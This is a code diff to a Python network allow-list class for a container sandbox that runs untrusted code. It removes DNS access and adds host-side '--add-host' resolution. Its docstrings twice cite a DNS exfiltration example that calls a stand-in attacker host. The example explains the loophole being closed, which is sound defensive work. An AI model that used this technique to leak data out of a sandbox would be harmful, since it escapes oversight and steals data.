@@ -226,19 +226,33 @@ class NetworkAllowList:
     ) -> List[str]:
         """Generate iptables shell commands to enforce the allow-list.
 
+        .. deprecated:: v3.1
+            This method generates in-container iptables rules, which
+            require NET_ADMIN capability and are vulnerable to the
+            Docker entrypoint TOCTOU. The v3.1 architecture uses
+            host-side Docker network isolation + ``--add-host`` DNS
+            injection (see :meth:`generate_add_host_args`) instead.
+            This method is retained for backward compatibility but
+            should NOT be used in new code.
+
         Returns a list of shell command strings to run inside the
         container. The commands:
           1. Allow loopback
           2. Allow established/related connections
-          3. Allow DNS (port 53) — to a specific resolver if
-             `dns_resolver` is set, otherwise to any resolver
-          4. For each allow-listed IP/CIDR: allow OUTPUT
-          5. Drop everything else (IPv4)
-          6. Deny all IPv6 (ip6tables DROP policy)
+          3. For each allow-listed IP/CIDR: allow OUTPUT
+          4. Drop everything else (IPv4)
+          5. Deny all IPv6 (ip6tables DROP policy)
+
+        v3.1: DNS (port 53) allow rules have been REMOVED. DNS
+        resolution is now handled by ``--add-host`` injection on the
+        host side (see :meth:`generate_add_host_args`), so the container
+        does not need DNS access. This closes the DNS exfiltration
+        loophole where malicious code could leak data via
+        ``socket.gethostbyname("secret.attacker.com")``.
 
         Domain entries are resolved to IPs at this point. Wildcard
-        domains are skipped (they rely on the DNS allow rule + the
-        candidate code's own hostname resolution).
+        domains are skipped (they rely on the SNI proxy for runtime
+        resolution on the host side).
 
         The commands use `iptables` and `ip6tables` which must be
         available in the container image. The purpose-built
@@ -246,12 +260,9 @@ class NetworkAllowList:
         apt-get at runtime (see sandbox/Dockerfile).
 
         Args:
-            dns_resolver: optional IP address of a DNS resolver to
-                restrict DNS queries to. When None, DNS is allowed to
-                any resolver (needed for hostname resolution). When set,
-                only the specified resolver can receive DNS queries,
-                preventing DNS-based data exfiltration through arbitrary
-                resolvers.
+            dns_resolver: deprecated — ignored in v3.1 (DNS is injected
+                via --add-host, not allowed via iptables). Retained for
+                backward compatibility.
         """
         if self.is_empty:
             # No entries -> deny all (equivalent to --network=none,
@@ -276,32 +287,20 @@ class NetworkAllowList:
             "iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT"
         )
 
-        # 3. Allow DNS (UDP/TCP port 53).
-        #    If a specific resolver is provided, restrict DNS to that
-        #    resolver only. Otherwise, allow DNS to any resolver (needed
-        #    because iptables rules use IPs, but the candidate code may
-        #    need to resolve hostnames at runtime).
-        if dns_resolver:
-            rules.append(
-                f"iptables -A OUTPUT -d {dns_resolver} -p udp --dport 53 -j ACCEPT"
-            )
-            rules.append(
-                f"iptables -A OUTPUT -d {dns_resolver} -p tcp --dport 53 -j ACCEPT"
-            )
-        else:
-            rules.append("iptables -A OUTPUT -p udp --dport 53 -j ACCEPT")
-            rules.append("iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT")
+        # v3.1: DNS (port 53) allow rules REMOVED. DNS resolution is
+        # now handled by --add-host injection on the host side (see
+        # generate_add_host_args), so the container does not need DNS
+        # access. This closes the DNS exfiltration loophole.
 
-        # 4. Allow each allow-listed destination.
+        # 3. Allow each allow-listed destination.
         resolved_count = 0
         for entry in self.entries:
             if entry.wildcard:
                 # Wildcard domains can't be resolved to IPs. They rely
-                # on the DNS allow rule + the candidate code resolving
-                # the hostname at runtime. The actual IP filtering is
-                # not possible for wildcards without a DNS proxy.
+                # on the SNI proxy for runtime resolution on the host
+                # side. The container itself never makes a DNS query.
                 print(f"[NetworkAllowList] Wildcard domain "
-                      f"*.{entry.host} — relies on DNS allow rule "
+                      f"*.{entry.host} — relies on SNI proxy "
                       f"(no IP-level filtering for this entry)")
                 continue
 
@@ -326,10 +325,10 @@ class NetworkAllowList:
                     )
                 resolved_count += 1
 
-        # 5. Drop everything else (IPv4).
+        # 4. Drop everything else (IPv4).
         rules.append("iptables -P OUTPUT DROP")
 
-        # 6. Deny all IPv6 egress.
+        # 5. Deny all IPv6 egress.
         #    The allow-list rules above only cover IPv4 (iptables). To
         #    prevent IPv6 bypass, we set ip6tables OUTPUT policy to DROP
         #    and allow only loopback + established connections. If IPv6
@@ -356,6 +355,41 @@ class NetworkAllowList:
         if self.is_empty:
             return ["--network", "none"]
         return ["--network", "default"]
+
+    def generate_add_host_args(self) -> List[str]:
+        """Generate Docker ``--add-host`` arguments for DNS injection (v3.1).
+
+        Resolves each allow-listed domain on the HOST at startup and
+        injects the mapping directly into the container's
+        ``/etc/hosts`` via Docker's ``--add-host`` flag. This eliminates
+        the need for DNS (port 53) access inside the container, closing
+        the DNS exfiltration loophole where malicious code could leak
+        data via ``socket.gethostbyname("secret.attacker.com")``.
+
+        Wildcard domains (``*.example.com``) cannot be resolved to a
+        single IP — they are skipped here and rely on the SNI proxy for
+        runtime resolution. The SNI proxy resolves them on the host side
+        (outside the container), so the container itself never makes a
+        DNS query.
+
+        Returns:
+            A list of ``["--add-host", "host:ip", ...]`` pairs suitable
+            for splicing into a ``docker run`` command. Empty list if no
+            domains are resolvable.
+        """
+        args: List[str] = []
+        for entry in self.entries:
+            if entry.kind != "domain" or entry.wildcard:
+                continue
+            ips = entry.resolved_ips()
+            if not ips:
+                print(f"[NetworkAllowList] Could not resolve {entry.host} "
+                      f"for --add-host injection — skipping (fail-closed "
+                      f"for this domain)")
+                continue
+            # Use the first resolved IP. --add-host takes "host:ip".
+            args.extend(["--add-host", f"{entry.host}:{ips[0]}"])
+        return args
 
     def summary(self) -> Dict[str, Any]:
         """Return a summary dict for logging/debugging."""
